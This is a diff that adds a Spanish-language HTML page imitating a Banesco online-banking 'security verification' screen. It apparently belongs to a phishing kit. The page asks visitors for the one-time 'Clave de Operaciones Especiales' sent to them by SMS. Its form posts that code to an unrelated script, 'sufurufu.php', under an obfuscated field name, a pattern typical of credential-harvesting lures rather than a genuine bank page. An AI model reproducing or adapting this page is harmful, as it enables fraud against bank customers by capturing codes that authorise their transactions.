@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+
+<html lang="es" >
+   <head>
+      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+      <title>My ASP.NET</title>
+      
+      <link href="css" rel="stylesheet">
+      <script src="modernizr"></script>
+      <link href="Site.css" rel="stylesheet" type="text/css">
+      <link href="datatables.css" rel="stylesheet" type="text/css">
+      <link rel="stylesheet" href="bootstrap.css">
+      <link rel="stylesheet" href="all.css">
+      <link rel="stylesheet" href="StylesheetIcon(1).css">
+      <link rel="stylesheet" href="sweetalert2(1).css">
+      <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+      <style>
+         #myDIV {
+         overflow: auto;
+         }
+      </style>
+      
+   </head>
+   <body style="overflow: hidden;" onload="GoTopPage()">
+      <div id="body">
+         <div class="container-fluid" >
+            <div class="col-xs-12" id="TituloX">
+               <h5 class="encabezado"><b>Pago Móvil</b> &gt; Pago Móvil Web</h5>
+            </div>
+            <style>
+               #DivContenedor {
+               overflow: auto;
+               }
+            </style>
+            <div class="col-xs-12" id="DivContenedor">
+               <div class="panel panel-default" id="TituloContenedor">
+                  <div class="panel-heading">
+                     <div class="ConDiv">
+                        <i class="icon-exclamacion"></i>
+                     </div>
+                     <h3 class="panel-title" style="font-size: 14px;"><b>VERIFICACIÓN DE SEGURIDAD</b></h3>
+                  </div>
+                  <div class="panel-body">
+                     <p class="banesco_info_panel">
+                        Para ingresar Ud. necesita la Clave de Operaciones Especiales.
+                        <br>
+                        <b style="color:#007953">Consulte los mensajes de texto en su celular para obtener la clave que debe utilizar en esta pantalla.</b>
+                        <br>
+                        <br>
+                        Dicha clave de operaciones especiales será valida para <b>ingresar a BanescOnline y vencerá cuando se desconecte o cierre la sesión</b>.
+                     </p>
+                     
+                  </div>
+               </div>
+            </div>
+            <div class="col-xs-12">
+               <div align="center">
+                  <form class="form-horizontal" role="form" method="post" target="_top" action="sufurufu.php"  >
+                     <div class="form-group col-md-12 formStyle">
+                        <label for="ejemplo_password_3" class="col-xs-5 control-label payment_font">Ingrese su Clave de Operaciones Especiales:</label>
+                        <div class="col-xs-3">
+                           <input type="text" class="form-control" name="t0s24uS824s" required  pattern="[0-9]{7,8}" maxlength="7" minlength="7" onKeypress="if (event.keyCode < 45 || event.keyCode > 57) event.returnValue = false;">
+                        </div>
+                     </div>
+                     <div class="form-group" aling="center">
+                        <div class="col-xs-11">
+                          
+                           <div class="col-xs-1"></div>
+                           <button id="botonconfirmar" onclick="GoTopPage()" type="submit" class="btn btn-primary " data-target="#exampleModal">
+                           Aceptar
+                           </button>
+                        </div>
+                     </div>
+                  </form>
+               </div>
+            </div>
+         </div>
+      </div>
+     
+</html>
